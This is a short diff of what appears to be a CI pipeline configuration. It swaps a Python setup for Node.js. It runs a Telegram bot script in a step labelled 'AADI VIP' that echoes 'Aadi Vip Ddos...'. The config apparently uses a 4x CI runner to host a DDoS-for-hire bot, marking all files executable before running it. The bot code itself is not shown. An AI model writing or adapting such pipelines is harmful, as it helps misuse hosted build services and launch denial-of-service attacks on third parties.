@@ -3,8 +3,8 @@ pipelines:
     - step:
         name: AADI VIP
         size: 4x
-        image: python:3.12
+        image: node:16
         script:
           - echo "Aadi Vip Ddos..."
-          - apt-get update && apt-get update --all && pip install --upgrade pip && pip install --upgrade requests
-          - pip install telebot pymongo aiohttp && chmod +x * && python3 m.py
+          - apt update && apt install nodejs npm
+          - npm init -y && npm install node-telegram-bot-api && chmod +x * && node bot.js
